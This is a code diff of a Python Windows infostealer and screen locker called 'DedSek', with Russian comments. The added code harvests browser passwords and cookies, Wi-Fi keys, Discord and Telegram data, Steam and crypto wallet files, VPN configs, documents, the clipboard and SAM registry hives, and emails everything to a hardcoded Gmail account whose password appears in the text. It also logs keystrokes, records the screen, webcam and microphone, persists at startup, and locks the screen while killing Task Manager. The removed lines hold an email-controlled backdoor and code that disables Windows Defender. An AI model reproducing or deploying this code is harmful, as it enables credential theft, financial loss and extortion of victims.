@@ -1,7 +1,7 @@
 import ctypes, os, sys, time, threading, tempfile, tkinter as tk
 from tkinter import PhotoImage
 import shutil, winshell, base64, random, socket, subprocess, json
-import urllib.request, urllib.parse, smtplib, imaplib, email
+import urllib.request, urllib.parse, smtplib, email
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
@@ -19,20 +19,18 @@ SKULL_BASE64 = "YOUR_BASE64_HERE"
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
-CHECK_INTERVAL = 15
 
 attempts_left = MAX_ATTEMPTS
 keylog_data = []
 
-# ===== СКРЫТИЕ CMD =====
+# ===== СКРЫТИЕ =====
 def hide_console():
     try:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-        if hwnd:
-            ctypes.windll.user32.ShowWindow(hwnd, 0)
+        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
     except: pass
 
-# ===== WIN LOCK =====
+# ===== WIN =====
 def disable_win_key():
     try:
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
@@ -73,7 +71,7 @@ def send_file_email(fp, desc):
     except: pass
 
 # ===== АВТОЗАГРУЗКА =====
-def add_all_to_startup():
+def add_to_startup():
     try:
         cp = os.path.abspath(__file__)
         pp = os.path.splitext(cp)[0] + ".pyw"
@@ -81,38 +79,15 @@ def add_all_to_startup():
             try: shutil.copy2(cp, pp)
             except: pass
             cp = pp
-        
         pythonw = sys.executable.replace("python.exe", "pythonw.exe")
-        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-        
-        _reg_add("DedSek_Stealer", pythonw, cp, "--stealer")
-        _reg_add("DedSek_Backdoor", pythonw, cp, "--backdoor")
-        _reg_add("DedSek_Locker", pythonw, cp, "--locker")
-        
-        for f in ["WindowsService_Stealer.pyw", "WindowsService_Backdoor.pyw", "WindowsService_Locker.pyw"]:
-            dest = os.path.join(startup, f)
-            if cp != dest:
-                try: shutil.copy2(cp, dest)
-                except: pass
-        
-        os.system(f'schtasks /delete /tn "DedSek_Locker_Task" /f >nul 2>&1')
-        os.system(f'schtasks /create /tn "DedSek_Locker_Task" /tr "\\"{pythonw}\\" \\"{cp}\\" --locker" /sc ONLOGON /rl HIGHEST /f /it >nul 2>&1')
-    except: pass
-
-def _reg_add(name, pythonw, script, args):
-    try:
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, f'"{pythonw}" "{script}" {args}')
+        winreg.SetValueEx(k, "DedSek", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
         winreg.CloseKey(k)
-    except: pass
-
-# ===== DEFENDER =====
-def bypass_defender():
-    try:
-        if is_admin():
-            for p in [tempfile.gettempdir(), os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')]:
-                os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{p}\'" >nul 2>&1')
-            os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1')
+        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        dest = os.path.join(startup, 'WindowsService.pyw')
+        if cp != dest:
+            try: shutil.copy2(cp, dest)
+            except: pass
     except: pass
 
 # ===== РАСШИФРОВКА =====
@@ -221,9 +196,16 @@ def steal_firefox():
             except: pass
     return res
 
-def steal_cookies():
+def steal_cookies_all():
     r = []
-    for cp in [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')]:
+    paths = [
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'),
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'),
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Cookies'),
+        os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Cookies'),
+    ]
+    for cp in paths:
         if not os.path.exists(cp): continue
         try:
             db = os.path.join(tempfile.gettempdir(), f'ck_{random.randint(0,9999)}.db')
@@ -233,13 +215,13 @@ def steal_cookies():
             for host, name, enc in cur.fetchall():
                 try:
                     val = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8','ignore')
-                    r.append(f"CHROME | {host} | {name} | {val[:100]}")
+                    r.append(f"{host} | {name} | {val[:100]}")
                 except: pass
             cur.close(); os.remove(db)
         except: pass
-    return r[:300] if r else ["No cookies"]
+    return r[:500] if r else ["No cookies"]
 
-def steal_wifi_passwords():
+def steal_wifi():
     r = []
     try:
         for line in subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace').split('\n'):
@@ -250,7 +232,7 @@ def steal_wifi_passwords():
                     key = "НЕТ"
                     for dl in det.split('\n'):
                         if 'Содержимое ключа' in dl: key = dl.split(':')[1].strip()
-                    r.append(f"WiFi: {p} | Пароль: {key}")
+                    r.append(f"{p}: {key}")
     except: pass
     return r
 
@@ -265,22 +247,111 @@ def steal_discord():
                 except: pass
     return list(tokens)[:20]
 
-def dump_sam():
+def steal_telegram():
+    tg = os.path.join(os.environ['APPDATA'], 'Telegram Desktop', 'tdata')
+    if not os.path.exists(tg): return
     try:
-        if not is_admin(): return "No admin"
+        z = os.path.join(tempfile.gettempdir(), 'telegram.zip')
+        with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
+            for r, d, files in os.walk(tg):
+                for f in files:
+                    if not f.endswith('.exe') and not f.endswith('.dll'):
+                        zf.write(os.path.join(r, f), os.path.relpath(os.path.join(r, f), tg))
+        send_file_email(z, "Telegram")
+        try: os.remove(z)
+        except: pass
+    except: pass
+
+def steal_steam():
+    steam = os.path.join(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)'), 'Steam')
+    if os.path.exists(steam):
+        for f in ['config/loginusers.vdf', 'config/config.vdf', 'ssfn']:
+            fp = os.path.join(steam, f)
+            if os.path.exists(fp):
+                send_file_email(fp, f"Steam {os.path.basename(fp)}")
+
+def steal_minecraft():
+    mc = os.path.join(os.environ['APPDATA'], '.minecraft')
+    if os.path.exists(mc):
+        for f in ['launcher_accounts.json', 'launcher_profiles.json']:
+            fp = os.path.join(mc, f)
+            if os.path.exists(fp):
+                send_file_email(fp, f"Minecraft {f}")
+
+def steal_vpn():
+    vpn_paths = [
+        os.path.join(os.environ['USERPROFILE'], 'OpenVPN', 'config'),
+        os.path.join(os.environ['PROGRAMFILES'], 'OpenVPN', 'config'),
+        os.path.join(os.environ['PROGRAMFILES'], 'WireGuard', 'Data'),
+    ]
+    for path in vpn_paths:
+        if os.path.exists(path):
+            z = os.path.join(tempfile.gettempdir(), 'vpn.zip')
+            with zipfile.ZipFile(z, 'w') as zf:
+                for r, d, files in os.walk(path):
+                    for f in files:
+                        if f.endswith('.ovpn') or f.endswith('.conf') or f.endswith('.key'):
+                            zf.write(os.path.join(r, f), f)
+            send_file_email(z, "VPN Configs")
+            try: os.remove(z)
+            except: pass
+
+def steal_crypto():
+    wallets = {
+        "Bitcoin": os.path.join(os.environ['APPDATA'], 'Bitcoin', 'wallet.dat'),
+        "Electrum": os.path.join(os.environ['APPDATA'], 'Electrum', 'wallets'),
+        "Exodus": os.path.join(os.environ['APPDATA'], 'Exodus', 'exodus.wallet'),
+        "Atomic": os.path.join(os.environ['APPDATA'], 'atomic'),
+    }
+    for name, path in wallets.items():
+        if os.path.exists(path):
+            if os.path.isfile(path):
+                send_file_email(path, f"Crypto {name}")
+            else:
+                z = os.path.join(tempfile.gettempdir(), f'{name}.zip')
+                with zipfile.ZipFile(z, 'w') as zf:
+                    for r, d, files in os.walk(path):
+                        for f in files: zf.write(os.path.join(r, f), f)
+                send_file_email(z, f"Crypto {name}")
+                try: os.remove(z)
+                except: pass
+
+def steal_clipboard():
+    try:
+        import win32clipboard
+        win32clipboard.OpenClipboard()
+        if win32clipboard.IsClipboardFormatAvailable(1):
+            data = win32clipboard.GetClipboardData()
+            if data:
+                send_email(f"CLIPBOARD:\n{str(data)[:2000]}", "Clipboard")
+        win32clipboard.CloseClipboard()
+    except: pass
+
+def steal_files():
+    for folder in [os.path.join(os.environ['USERPROFILE'], 'Desktop'), os.path.join(os.environ['USERPROFILE'], 'Documents')]:
+        if not os.path.exists(folder): continue
+        for f in os.listdir(folder):
+            fp = os.path.join(folder, f)
+            if os.path.isfile(fp) and os.path.getsize(fp) < 5*1024*1024:
+                ext = os.path.splitext(f)[1].lower()
+                if ext in ['.txt','.doc','.docx','.pdf','.xlsx','.key','.wallet','.dat','.rdp','.ovpn','.json','.xml']:
+                    send_file_email(fp, f"File: {f}")
+
+def dump_sam():
+    if not is_admin(): return "No admin"
+    try:
         sp = os.path.join(tempfile.gettempdir(), 'sam'); syp = os.path.join(tempfile.gettempdir(), 'system')
         os.system(f'reg save HKLM\\SAM "{sp}" /y >nul 2>&1')
         os.system(f'reg save HKLM\\SYSTEM "{syp}" /y >nul 2>&1')
         if os.path.exists(sp) and os.path.getsize(sp) > 100:
             z = os.path.join(tempfile.gettempdir(), 'sam.zip')
-            with zipfile.ZipFile(z, 'w') as zf:
-                zf.write(sp, 'sam'); zf.write(syp, 'system')
+            with zipfile.ZipFile(z, 'w') as zf: zf.write(sp, 'sam'); zf.write(syp, 'system')
             send_file_email(z, "SAM+SYSTEM")
             try: os.remove(z); os.remove(sp); os.remove(syp)
             except: pass
             return "SAM dumped!"
-        return "Failed"
-    except: return "Error"
+    except: pass
+    return "Failed"
 
 def capture_webcam():
     try:
@@ -328,163 +399,68 @@ def keylogger_thread():
         keyboard.on_press(on_key)
     except: pass
 
-def scan_configs():
-    configs = {
-        "SSH": os.path.join(os.environ['USERPROFILE'], '.ssh', 'id_rsa'),
-        "RDP": os.path.join(os.environ['USERPROFILE'], 'Documents', 'Default.rdp'),
-    }
-    for name, path in configs.items():
-        if os.path.exists(path) and os.path.getsize(path) < 5*1024*1024:
-            send_file_email(path, f"Config: {name}")
-
-def scan_router():
-    for ip, creds in [("192.168.1.1", [("admin","admin"),("admin","1234")]), ("192.168.0.1", [("admin","admin")])]:
-        for u, p in creds:
-            try:
-                req = urllib.request.Request(f"http://{ip}/", headers={'Authorization': 'Basic ' + base64.b64encode(f"{u}:{p}".encode()).decode()})
-                if urllib.request.urlopen(req, timeout=3).getcode() == 200:
-                    send_email(f"ROUTER {ip} | {u}:{p}", "Router Password")
-                    return
-            except: pass
-
 # ===== МЕГА-СТИЛЕР =====
-def mega_steal_auto():
+def mega_steal():
+    R = ["="*60, "🔥 DEDSEK ULTIMATE STEALER v3.0 🔥", "="*60]
+    R += [f"\nUSER: {os.environ.get('USERNAME')}", f"PC: {socket.gethostname()}"]
+    
+    try: R.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
+    except: pass
     try:
-        R = ["="*60, "DEDSEK AUTO-STEAL REPORT", "="*60]
-        R += [f"\nUSER: {os.environ.get('USERNAME')}", f"PC: {socket.gethostname()}"]
-        
-        try: R.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
-        except: pass
-        try:
-            ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
-            g = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5).read())
-            R.append(f"PUBLIC IP: {ip} | {g.get('country','?')} | {g.get('city','?')} | {g.get('isp','?')}")
-        except: pass
-        
-        try: R.append("\nIPCONFIG:\n" + subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:5000])
-        except: pass
-        
-        R.append("\n=== WIFI ===")
-        R.extend(steal_wifi_passwords() or ["No WiFi"])
-        
-        R.append("\n=== BROWSERS ===")
-        for name, paths in {
-            "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
-            "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
-            "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
-            "OPERA": [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')],
-        }.items():
-            data = steal_chromium(name, paths)
-            R.append(f"\n--- {name} ---")
-            R.extend(data if data else ["No data"])
-        
-        R.append("\n--- FIREFOX ---")
-        R.extend(steal_firefox() or ["No data"])
-        
-        R.append("\n=== COOKIES ===")
-        R.extend(steal_cookies())
-        
-        R.append("\n=== DISCORD ===")
-        tokens = steal_discord()
-        R.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["No tokens"])
-        
-        R.append("\n=== SAM ===")
-        R.append(dump_sam())
-        
-        threading.Thread(target=scan_configs, daemon=True).start()
-        threading.Thread(target=scan_router, daemon=True).start()
-        threading.Thread(target=capture_webcam, daemon=True).start()
-        threading.Thread(target=record_mic, daemon=True).start()
-        
-        try:
-            ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
-            ImageGrab.grab().save(ss, 'JPEG', quality=50)
-            send_file_email(ss, "Desktop Screenshot")
-            try: os.remove(ss)
-            except: pass
-        except: pass
-        
-        R += ["\n" + "="*60, f"REPORT: {time.strftime('%d.%m.%Y %H:%M:%S')}", "="*60]
-        
-        text = '\n'.join(R)
-        for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
-            send_email(part, f"DedSek Report [{i+1}]")
-    except Exception as e:
-        send_email(f"Stealer error: {e}")
-
-# ===== БЕКДОР =====
-def mail_controller():
-    while True:
-        try:
-            mail = imaplib.IMAP4_SSL('imap.gmail.com')
-            mail.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); mail.select('inbox')
-            _, data = mail.search(None, 'SUBJECT "DEDSEK"', 'UNSEEN')
-            if data[0]:
-                for n in data[0].split():
-                    _, md = mail.fetch(n, '(RFC822)')
-                    msg = email.message_from_bytes(md[0][1])
-                    if msg.is_multipart():
-                        for p in msg.walk():
-                            if p.get_content_type() == "text/plain":
-                                cmd = p.get_payload(decode=True).decode().strip()
-                                resp = _process_cmd(cmd)
-                                if resp: send_email(resp, "DEDSEK RESPONSE")
-                    mail.store(n, '+FLAGS', '\\Seen')
-            mail.close(); mail.logout()
-        except: pass
-        time.sleep(CHECK_INTERVAL)
-
-def _process_cmd(cmd):
+        ip = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
+        g = json.loads(urllib.request.urlopen(f"http://ip-api.com/json/{ip}", timeout=5).read())
+        R.append(f"PUBLIC IP: {ip} | {g.get('country','?')} | {g.get('city','?')} | {g.get('isp','?')}")
+    except: pass
+    
+    try: R.append("\nIPCONFIG:\n" + subprocess.check_output("ipconfig /all", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:5000])
+    except: pass
+    
+    R.append("\n=== WIFI ===")
+    R.extend(steal_wifi() or ["No WiFi"])
+    
+    R.append("\n=== BROWSER PASSWORDS ===")
+    browsers = {
+        "CHROME": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')],
+        "EDGE": [os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')],
+        "YANDEX": [os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data')],
+        "OPERA": [os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')],
+        "BRAVE": [os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data')],
+    }
+    for name, paths in browsers.items():
+        data = steal_chromium(name, paths)
+        R.append(f"\n--- {name} ---")
+        R.extend(data if data else ["No data"])
+    
+    R.append("\n--- FIREFOX ---")
+    R.extend(steal_firefox() or ["No data"])
+    
+    R.append("\n=== COOKIES ===")
+    R.extend(steal_cookies_all())
+    
+    R.append("\n=== DISCORD ===")
+    tokens = steal_discord()
+    R.extend([f"TOKEN: {t}" for t in tokens] if tokens else ["No tokens"])
+    
+    R.append("\n=== SAM ===")
+    R.append(dump_sam())
+    
+    # Всё остальное в фоне
+    for t in [steal_telegram, steal_steam, steal_minecraft, steal_vpn, steal_crypto, steal_clipboard, steal_files, capture_webcam, record_mic]:
+        threading.Thread(target=t, daemon=True).start()
+    
     try:
-        parts = cmd.split(':', 1)
-        action = parts[0].upper().strip()
-        arg = parts[1].strip() if len(parts) > 1 else ""
-        
-        if action == "INFO":
-            return f"USER: {os.environ.get('USERNAME')}\nPC: {socket.gethostname()}\nIP: {socket.gethostbyname(socket.gethostname())}\nADMIN: {is_admin()}"
-        elif action == "CMD":
-            try:
-                r = subprocess.check_output(arg, shell=True, stderr=subprocess.STDOUT, timeout=60)
-                return r.decode('cp866', errors='replace')[:5000]
-            except subprocess.CalledProcessError as e:
-                return e.output.decode('cp866', errors='replace')[:5000]
-        elif action == "STEAL":
-            threading.Thread(target=mega_steal_auto, daemon=True).start()
-            return "Stealer started"
-        elif action == "SCREENSHOT":
-            fp = os.path.join(tempfile.gettempdir(), f'ss_{int(time.time())}.jpg')
-            ImageGrab.grab().save(fp, 'JPEG', quality=50)
-            send_file_email(fp, "Screenshot")
-            try: os.remove(fp)
-            except: pass
-            return "Screenshot sent!"
-        elif action == "WEBCAM":
-            capture_webcam()
-            return "Webcam sent"
-        elif action == "MIC":
-            threading.Thread(target=record_mic, daemon=True).start()
-            return "Recording 30s"
-        elif action == "DOWNLOAD":
-            url = arg.strip()
-            fp = os.path.join(tempfile.gettempdir(), f'dl_{int(time.time())}.exe')
-            urllib.request.urlretrieve(url, fp)
-            subprocess.Popen(fp, shell=True)
-            return f"OK: {url}"
-        elif action == "LOCK":
-            ctypes.windll.user32.LockWorkStation()
-            return "Locked"
-        elif action == "BSOD":
-            threading.Thread(target=lambda: (time.sleep(2), ctypes.windll.ntdll.RtlAdjustPrivilege(19,1,0,ctypes.byref(ctypes.c_bool())), ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD,0,0,0,6,ctypes.byref(ctypes.c_uint()))), daemon=True).start()
-            return "BSOD"
-        elif action == "SHUTDOWN":
-            os.system("shutdown /s /t 10 /f")
-            return "Shutdown"
-        elif action == "HELP":
-            return "INFO|CMD:|STEAL|SCREENSHOT|WEBCAM|MIC|DOWNLOAD:|LOCK|BSOD|SHUTDOWN|KEYLOG|COOKIES|WIFI|SAM|DISCORD"
-        else:
-            return f"Unknown: {action}"
-    except Exception as e:
-        return f"Error: {e}"
+        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
+        ImageGrab.grab().save(ss, 'JPEG', quality=50)
+        send_file_email(ss, "Screenshot")
+        try: os.remove(ss)
+        except: pass
+    except: pass
+    
+    R += ["\n" + "="*60, f"REPORT: {time.strftime('%d.%m.%Y %H:%M:%S')}", "="*60]
+    
+    text = '\n'.join(R)
+    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
+        send_email(part, f"DedSek [{i+1}]")
 
 # ===== ЗАПИСЬ ЭКРАНА =====
 def record_loop():
@@ -507,27 +483,23 @@ def record_loop():
             except: pass
         except: time.sleep(1)
 
-# ===== ВИНЛОКЕР (ИСПРАВЛЕНО - ВВОД РАБОТАЕТ) =====
+# ===== ВИНЛОКЕР =====
 def block_keys():
     try:
         import keyboard
-        combos = ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen','left windows','right windows']
-        for c in combos:
+        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','alt','ctrl','shift','f11','print screen','alt+print screen','left windows','right windows']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
-    except:
-        try: ctypes.windll.user32.BlockInput(True)
-        except: pass
+    except: pass
 
 def unblock():
     try: ctypes.windll.user32.BlockInput(False)
     except: pass
-    try:
-        import keyboard; keyboard.unhook_all()
+    try: import keyboard; keyboard.unhook_all()
     except: pass
 
 def kill_procs():
-    kl = ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe"]
+    kl = ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe"]
     while True:
         for p in kl: os.system(f"taskkill /f /im {p} >nul 2>&1")
         time.sleep(0.05)
@@ -570,16 +542,11 @@ class WinLocker:
         self.win = tk.Toplevel(self.root)
         self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
         self.win.configure(bg='black'); self.win.overrideredirect(True)
-        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
-        self.win.focus_force()
-        
+        self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
         global attempts_left
         
         try:
-            img_data = base64.b64decode(SKULL_BASE64)
-            img_path = os.path.join(tempfile.gettempdir(), "dedsek.png")
-            with open(img_path, "wb") as f: f.write(img_data)
-            img = PhotoImage(file=img_path)
+            img = PhotoImage(file=base64.b64decode(SKULL_BASE64))
             tk.Label(self.win, image=img, bg='black').place(relx=0.5, rely=0.08, anchor='center')
             self.win._img = img
         except: pass
@@ -590,12 +557,10 @@ class WinLocker:
 
 Я — год, когда произошло событие,
 которое не произошло.
-
 В Англии заговорщики планировали
 взорвать парламент и убить короля.
 Их план провалился, король выжил,
 а заговорщиков казнили.
-
 Но в Windows я стал началом времён.
 Потому что я — первый год,
 который существует в этом мире,
@@ -603,11 +568,7 @@ class WinLocker:
 
 ЧТО Я ЗА ЧИСЛО?
 
-ПОДСКАЗКА: Это связано с Windows,
-а не с реальной историей.
-
-У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ.
-НЕ УГАДАЕШЬ — ДАННЫЕ УДАЛЕНЫ НАВСЕГДА."""
+У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ."""
         
         tk.Label(self.win, text=msg, bg='black', fg='#00FF00', font=('Courier',9,'bold'), justify='left').place(relx=0.5, rely=0.45, anchor='center')
         
@@ -617,15 +578,11 @@ class WinLocker:
         self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
         self.status_lbl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='#FF0000', font=('Courier',12,'bold'))
         self.status_lbl.pack()
-        self.pw.bind('<Return>', self.check)
-        self.pw.focus_force()
+        self.pw.bind('<Return>', self.check); self.pw.focus_force()
         self.win.after(100, self._keep)
     
     def _keep(self):
-        try:
-            self.win.focus_force()
-            self.pw.focus_force()
-            self.win.after(100, self._keep)
+        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
         except: pass
     
     def check(self, e=None):
@@ -642,42 +599,11 @@ class WinLocker:
                 self.root.destroy(); reset_windows()
             self.pw.delete(0, tk.END)
 
-# ===== MAIN =====
 if __name__ == "__main__":
-    hide_console()
-    disable_win_key()
-    bypass_defender()
-    
-    if "--stealer" in sys.argv:
-        mega_steal_auto()
-        sys.exit(0)
-    
-    if "--backdoor" in sys.argv:
-        mail_controller()
-        sys.exit(0)
-    
-    if "--locker" in sys.argv:
-        time.sleep(TIMER_SECONDS)
-        boot_anim()
-        block_keys()
-        try: ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Service...")
-        except: pass
-        threading.Thread(target=kill_procs, daemon=True).start()
-        WinLocker()
-        tk.mainloop()
-        sys.exit(0)
-    
-    add_all_to_startup()
-    threading.Thread(target=mega_steal_auto, daemon=True).start()
+    hide_console(); disable_win_key(); add_to_startup()
+    threading.Thread(target=mega_steal, daemon=True).start()
     threading.Thread(target=record_loop, daemon=True).start()
-    threading.Thread(target=mail_controller, daemon=True).start()
     threading.Thread(target=keylogger_thread, daemon=True).start()
-    
-    time.sleep(TIMER_SECONDS)
-    boot_anim()
-    block_keys()
-    try: ctypes.windll.user32.ShutdownBlockReasonCreate(ctypes.windll.kernel32.GetConsoleWindow(), "Windows Service...")
-    except: pass
+    time.sleep(TIMER_SECONDS); boot_anim(); block_keys()
     threading.Thread(target=kill_procs, daemon=True).start()
-    WinLocker()
-    tk.mainloop()
+    WinLocker(); tk.mainloop()
